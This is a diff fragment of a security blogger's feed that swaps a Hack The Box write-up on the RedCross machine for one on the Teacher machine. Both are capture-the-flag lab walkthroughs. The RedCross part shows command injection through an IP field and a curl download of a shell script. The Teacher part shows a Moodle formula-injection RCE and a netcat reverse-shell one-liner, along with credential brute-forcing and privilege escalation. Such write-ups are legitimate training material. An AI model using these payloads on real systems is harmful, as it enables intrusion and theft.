-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
-&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---vault&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/vault/&quot;&gt;Hack The Box - Vault&lt;/a&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---teacher&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/teacher/&quot;&gt;Hack The Box - Teacher&lt;/a&gt;&lt;/h4&gt;
-&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Web" /><category term="RCE" /><category term="php" /><summary type="html">Quick Summary Hey guys today RedCross retired and here is my write-up about it. To get an initial shell on this box there are two ways , first one is to exploit an authenticated RCE which gives you a shell as www-data , then escalate to root. The second way is to exploit a vulnerable smtp server called Haraka to get a shell as user then escalate to root. Both of the ways were fun and I liked this box. It’s a medium-rated linux box and its ip is 10.10.10.113 I added it to /etc/hosts as redcross.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC redcross.htb Port 22 is open and running ssh , there’s http and https on ports 80 and 443. As always we will check http. HTTP Initial Enumeration By going to http://redcross.htb it redirects us to https://intra.redcross.htb I added intra.redcross.htb to /etc/hosts next to the ip of the box which is 10.10.10.113 Let’s go to intra.redcross.htb again : Before doing anything I wanted to see if there are any other subdomains , so I used wfuzz with subdomains-top1mil-5000.txt from seclists : wfuzz -c -w subdomains-top1mil-5000.txt -H &quot;HOST:FUZZ.redcross.htb&quot; https://redcross.htb Responses for non-existing subdomains are 28 words so I stopped the scan to add --hw 28 to filter these responses : wfuzz -c -w subdomains-top1mil-5000.txt -H &quot;HOST:FUZZ.redcross.htb&quot; https://redcross.htb And we got admin.redcross.htb , So I added it to /etc/hosts : Note : to enumerate every subdoamin there has to be an entry for that subdomain in /etc/hosts that points to the ip of the box , that’s why I added the HOST HTTP header (-H &quot;HOST:FUZZ.redcross.htb&quot;) , it solves the problem. Now let’s go to admin.redcross.htb and see what’s there : It asks for login , we will get into this later but let’s go back to intra.redcross.htb and see what can we do from there. We need to login , I tried to bruteforce the login with wfuzz , so I intercepted the request with burp to see the parameters : Then I used wfuzz like we did before (I filtered responses with 32 chars). I used a small list for common credentials like admin:admin, top-usernames-shortlist.txt from seclists. wfuzz -c --hh 11 -u &quot;https://intra.redcross.htb/pages/actions.php&quot; -X POST -d &quot;user=FUZZ&amp;amp;pass=FUZZ&amp;amp;action=login&quot; -w top-usernames-shortlist.txt guest:guest gave us a different response. Let’s try it : And it worked. And we see this message : From: admin (uid 1) To: guest (uid 5) You're granted with a low privilege access while we're processing your credentials request. Our messaging system still in beta status. Please report if you find any incidence. Broken Session Management , Admin Panel After some enumeration I found that after being authenticated as guest on intra.redcross.htb you can use the session id on admin.redcross.htb and it will work : Now we have access to the admin panel , there are two areas : User Management and Network Access User Management : Can we really add users ? Let’s try test : Nice it gave us the credentials , let’s try ssh : And it worked , but it seems like we are not on the actual host , we are in a container or a jail , let’s look at /home : interface_data and public ? Last thing I checked was /etc/passwd to know any possible user : There’s a user called penelope , but no /home directory for penelope. So I gave up on this and looked at Network Access : I added my ip address to the whitelist: Then I scanned the box with nmap again to see if some new ports show up : there’s ftp on port 21 (anonymous login not allowed), postgresql SQL database on port 5432 and a service on port 1025 but nmap couldn’t really identify it. Now there are two ways to continue , I will show the RCE first. RCE on admin.redcross.htb , Reverse Shell as www-data On the Network Access Section you can add and remove ips from the whitelist , I added a random ip , let’s say 11.11.11.11 and intercepted the two requests with burp : Allow request : Response : Deny request : Response : We notice that it’s saying Executing iptables , so the ip we provide will be a part of a system command. I added |ls to the ip parameter in the deny request and got this response : Nice we have an RCE , let’s get a reverse shell , I created a reverse shell and called it shell.sh : Then I hosted it on a python simple HTTP server , and downloaded it on the box : curl http://10.10.xx.xx/shell.sh &amp;gt; /tmp/shell.sh Python Server : Let’s verify that the shell is on the box : Nice let’s execute : bash /tmp/shell.sh We got a shell as www-data : And we see in /home a directory for penelope , but we can’t read the user flag. Hardcoded PostgreSQL Database Credentials , Privilege Escalation to root In the root directory of the web application , there’s an interseting php file called actions.php. Interesting because it handled everything , we saw it earlier in all the POST requests. I looked into it and found credentials for a db user called unixusrmgr : if($action==='del'){ header('refresh:1;url=/?page=users'); $uid=$_POST['uid']; $dbconn = pg_connect(&quot;host=10.10.10.113 dbname=unix user=unixusrmgr password=dheu%7wjx8B&amp;amp;&quot;); $result = pg_prepare($dbconn, &quot;q1&quot;, &quot;delete from passwd_table where uid = $1&quot;); $result = pg_execute($dbconn, &quot;q1&quot;, array($uid)); echo &quot;User account deleted&quot;; } We knew earlier that the database is PostgreSQL , let’s connect : Some Cheatcheets for PostgreSQL : Github postgresqltutorial.com psql -h 127.0.0.1 -d unix -U unixusrmgr \dt to list the tables : I did select * from passwd_table; and got some users with their password hashes and other info , so I went back to the admin panel and added a user called rick : Then I did select * from passwd_table; again : We notice that the homedir is set to /var/jail/home that’s why we can’t access the actual host with created users. Also the gid is set to 1001. Let’s set that to 0 (root) : update passwd_table set gid=0 where gid=1001; Now the gid is 0 : Let’s also change the homedir : update passwd_table set homedir='/home' where homedir='/var/jail/home'; Let’s login with ssh again : by checking our gid : It’s root , we still can’t read the flags : We can’t also sudo : Weird , I checked /etc/sudoers and saw this line : If we got the gid of the group sudo , we will be able to run sudo. cat /etc/group | grep sudo The gid is 27 , let’s return to the database and change our gid from 0 to 27 : update passwd_table set gid=27 where gid=0; select * from passwd_table; Great , let’s terminate our ssh connection and login again. We are now a member of sudo and we can run sudo , so sudo su will give us a root shell. Let’s read the user flag : Before reading the root flag let’s see how can we actually get a user shell as penelope Vulnerable SMTP Server (Haraka) Back to the admin panel , after whitelisting the ip and doing a second nmap scan : Port 1025 was open and nmap couldn’t identify it. I tried several ways to connect to that port, nc , telnet , ftp etc… Fortunately ftp gave me this banner : That version of the SMTP server is vulnerable to a command injection and there’s a metasploit module for it : That’s how to get a shell on the box without the RCE in the web application. We can get a shell by typing shell , and we are penelope so we can read the user flag : After that we will do the same thing we did with the database and users. We already did it so we won’t do it again. Back to our ssh connection let’s read the root flag : And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Vault Next Hack The Box write-up : Hack The Box - Teacher</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/redcross/0.png" /></entry></feed>
+&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Web" /><category term="RCE" /><category term="php" /><summary type="html">Quick Summary Hey guys , today Teacher retired and here is my write-up about it. I don’t have too much to say about this box. It was an easy regular machine , We will exploit an authenticated remote code execution in a vulnerable version of a web application called moodle to get an initial shell on the box. And for privilege escalation we will find a directory which permissions are set to read , write and execute by anyone , and from there we can create a symlink to /root or anything else we want to access. It’s a linux box and its ip is 10.10.10.153 I added it to /etc/hosts as teacher.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC teacher.htb We only see http running on port 80. Let’s see what’s in there. HTTP Initial Enumeration There is just a static website titled Blackhat highschool , I looked into other pages like Courses , Students etc… And also checked their source code. And on Gallery : I found this line in the source : for &amp;lt;img src=&quot;images/5.png&quot;&amp;gt; there is an onerror attribute to print That's an F in the console. So I checked the console : Weird let’s check that image. http://teacher.htb/images/5.png : Corrupted file ? Let’s check if it’s really a corrupted image or it’s not an image at all : curl http://teacher.htb/images/5.png Hi Servicedesk, I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha. Could you guys figure out what the last charachter is, or just reset it? Thanks, Giovanni Nice , we have a username and a password but we still need to figure out the last character. But where will we use these credentials anyway ? I ran gobuster with /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt in the background and got some results , one of them was /moodle. http://teacher.htb/moodle Moodle is a free and open-source learning management system written in PHP and distributed under the GNU General Public License -Wikipedia On the login page there’s a guest login : However I couldn’t achieve anything from that guest login. Bruteforcing the last character We have the credentials but we need to figure out the last character of the password. I created a list of numbers , letters and special chars and printed them next to the password. for i in {a..z}; do echo Th4C00lTheacha$i; done &amp;gt; list.txt this will print all the letters next to Th4C00lTheacha Then I added some special chars manually like !@#$%^&amp;amp;*()_-+=.?/\ and finally I added numbers : for i in {0..9}; do echo Th4C00lTheacha$i; done &amp;gt;&amp;gt; list.txt list.txt : Th4C00lTheachaa Th4C00lTheachab Th4C00lTheachac Th4C00lTheachad Th4C00lTheachae Th4C00lTheachaf Th4C00lTheachag Th4C00lTheachah Th4C00lTheachai Th4C00lTheachaj Th4C00lTheachak Th4C00lTheachal Th4C00lTheacham Th4C00lTheachan Th4C00lTheachao Th4C00lTheachap Th4C00lTheachaq Th4C00lTheachar Th4C00lTheachas Th4C00lTheachat Th4C00lTheachau Th4C00lTheachav Th4C00lTheachaw Th4C00lTheachax Th4C00lTheachay Th4C00lTheachaz Th4C00lTheacha! Th4C00lTheacha@ Th4C00lTheacha# Th4C00lTheacha$ Th4C00lTheacha% Th4C00lTheacha^ Th4C00lTheacha&amp;amp; Th4C00lTheacha* Th4C00lTheacha( Th4C00lTheacha) Th4C00lTheacha_ Th4C00lTheacha- Th4C00lTheacha+ Th4C00lTheacha= Th4C00lTheacha. Th4C00lTheacha? Th4C00lTheacha/ Th4C00lTheacha\ Th4C00lTheacha0 Th4C00lTheacha1 Th4C00lTheacha2 Th4C00lTheacha3 Th4C00lTheacha4 Th4C00lTheacha5 Th4C00lTheacha6 Th4C00lTheacha7 Th4C00lTheacha8 Th4C00lTheacha9 Since it’s a small list , I used burp intruder to bruteforce the password. Let’s intercept the request and send it to intruder : After it’s finished , all the responses were 870 bytes in length except the response of the payload Th4C00lTheacha#. So probably this is the right password , let’s check. It worked and now we are in as Giovanni RCE , Initial Shell as www-data After some enumeration I didn’t find anything interesting , so I searched on Google and found this article. Let’s try to reproduce that vulnerability. First , we will go to the Algebra course : Then we will turn editing on : Now we can edit the course , so we will choose any topic and click on Add an activity or resource and we will choose Quiz : Then we will just fill in the required information : And click on Save and display. After that we will click on edit quiz : And add a new question. Question type will be Calculated : Again we will fill in the required information : And finally we reach the actual exploitation , we will set the answer formula to : /*{a*/`$_GET[0]`;//{x}}` This will allow us to pass system commands through a url parameter called 0 , More info about how the exploit is working can be found in the previously mentioned article. After saving the changes we will get this page : We will click on Next Page to finally get to the vulnerable page : Let’s add the parameter 0 and get a reverse shell : Shell : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc ip port &amp;gt;/tmp/f Note : the payload is url encoded. So final payload will be : &amp;amp;0=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&amp;gt;%261|nc+ip+port+&amp;gt;/tmp/f After sending the request , our listener gets a callback. And we get a reverse shell as www-data : There is only giovanni on the box and we can’t access his /home directory as www-data. Hardcoded Database Credentials , Privilege Escalation to giovanni Back to /var/www/html/moodle , I wanted to check config files and other stuff to see if there are any information that can help. And in config.php I found database credentials : Sweet , Let’s see what’s in there. mysql -h 127.0.0.1 -u root -p We are not in any database [(none)] , Let’s list the databases : SHOW DATABASES; moodle is interesting and might have some passwords. USE moodle; Now let’s check the tables : SHOW TABLES; A lot of tables , but an interesting one is called mdl_user : Alright , let’s see what’s in that table : SELECT * from mdl_user; We didn’t get the best output :D but anyway I looked into it and found this md5 hash : And its name is Giovannibak , probably a backup for giovanni’s password. crackstation was able to crack it : The password is expelled, we can su to giovanni Now we own user. 777. Ability to read , write and execute anything on the system In giovanni’s /home directory there is a directory called work which has two directories courses and tmp. Nothing Special. After a lot of enumeration I found in /usr/bin a script called backup.sh : We don’t really care about the tar commands , What we care about is that it’s changing current directory to /home/giovanni/work then changes it once again to /home/giovanni/work/tmp then changes permissions to 777 recursively. This means that any user can read , write and execute any file in /home/giovanni/work/tmp. So if we created a symlink for /root in /home/giovanni/work/tmp and wait for the script to get executed by root (cronjob) we will have access to /root. In normal conditions creating a symlink to /root won’t let you have access to it if you don’t have the permissions to. Because it’s still linking to a directory that you are not authorized to access. But since the script runs chmod 777 on /home/giovanni/work/tmp recursively, Anyone has access to what’s in there even symlinks. This article explains it very well. Read this if you don’t know what’s a symlink. Alright , Let’s create a symlink for /root in /home/giovanni/work/tmp ln -s /root ./tmp And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - RedCross Next Hack The Box write-up : Hack The Box - Irked</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/teacher/0.png" /></entry></feed>
